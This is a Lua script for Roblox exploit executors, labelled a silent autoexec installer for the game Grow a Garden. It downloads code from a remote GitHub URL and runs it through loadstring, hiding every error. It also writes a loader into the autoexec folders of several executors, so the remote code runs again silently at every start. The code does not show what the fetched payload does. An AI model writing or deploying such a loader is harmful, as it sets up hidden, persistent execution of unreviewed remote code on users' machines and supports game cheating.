-- ===== Grow a Garden Silent AutoExec Installer =====
local ALLOW_INSTALL = true
local GAME_ID = 7436755782
local FILE_NAME = "grow_a_garden_loader.lua"
local SCRIPT_URL = "https://raw.githubusercontent.com/Lunorhubb/SpeedHubX/refs/heads/main/loader.lua"

-- Silent fetch & run
local function fetchAndRun(url)
    pcall(function()
        local res = game:HttpGet(url)
        local func = loadstring(res)
        pcall(func)
    end)
end

-- Silent loader code for autoexec
local loaderCode = string.format([[
if game.GameId == %d then
    local function fetchAndRun(url)
        pcall(function()
            local res = game:HttpGet(url)
            local func = loadstring(res)
            pcall(func)
        end)
    end
    fetchAndRun("%s")
end
]], GAME_ID, SCRIPT_URL)

-- Known executor paths
local executorPaths = {
    Synapse = { "workspace/autoexec", "autoexec" },
    ["Synapse X"] = { "workspace/autoexec", "autoexec" },
    Krnl = { "krnl/autoexec", "autoexec" },
    Delta = { "workspace/autoexec", "autoexec" },
    Fluxus = { "workspace/autoexec", "autoexec" },
    ["Script-Ware"] = { "autoexec" },
    ["Script Ware"] = { "autoexec" }
}

-- Silent installer
local function tryInstall()
    if not writefile or not isfolder or not makefolder then return end
    local execName = (identifyexecutor and identifyexecutor()) or "Unknown"
    local paths = executorPaths[execName] or { "autoexec" }
    for _, path in ipairs(paths) do
        pcall(function()
            if not isfolder(path) then makefolder(path) end
            writefile(path .. "/" .. FILE_NAME, loaderCode)
        end)
    end
end

-- Run immediately if in Grow a Garden
if game.GameId == GAME_ID then
    fetchAndRun(SCRIPT_URL)
end

-- Install if allowed
if ALLOW_INSTALL then
    tryInstall()
end
